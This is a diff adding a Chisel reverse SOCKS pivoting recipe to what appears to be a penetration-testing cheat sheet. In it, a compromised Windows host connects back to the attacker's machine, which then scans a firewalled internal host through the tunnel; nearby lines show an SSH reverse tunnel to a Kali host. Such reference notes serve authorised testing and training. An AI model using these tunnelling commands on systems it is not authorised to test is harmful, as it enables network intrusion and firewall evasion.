@@ -1356,6 +1356,22 @@ sudo ssh -N -L 80:127.0.0.1:80 {USER}@{IP ADDRESS} -p {PORT}
 ssh -N -R {LHOST}:{LPORT}:127.0.0.1:{RPORT} kali@{LHOST}
 
 ```
+#### Chisel Dynamic Port Forwarding
+
+<br />
+
+```
+# LHOST
+chisel server -p 3477 --socks5 --reverse
+
+# RHOST (Windows) - Transfer chisel.exe
+chisel64.exe client {LHOST}:3477 R:socks
+PS> .\chisel64.exe client {LHOST}:3477 R:socks
+
+# LHOST
+sudo NMAP -sT -Pn {FIREWALLED RHOST}
+
+```
 
 <br />
 
